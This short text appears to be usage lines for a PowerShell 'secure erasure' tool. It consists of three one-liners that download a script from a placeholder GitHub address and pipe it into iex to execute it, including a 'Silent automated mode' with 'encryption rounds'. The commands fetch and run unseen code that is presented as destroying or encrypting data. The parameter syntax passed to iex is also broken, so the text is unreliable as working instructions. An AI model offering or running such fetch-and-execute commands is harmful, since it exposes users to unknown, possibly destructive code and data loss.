# Basic secure erasure (recommended)
irm "https://github.com/HOSTEDSCRIPT" | iex

# Maximum security with verification
irm "https://github.com/HOSTEDSCRIPT" | iex -EncryptionRounds 7 -Verify -Force

# Silent automated mode
irm "https://github.com/HOSTEDSCRIPT" | iex -Silent -EncryptionRounds 5
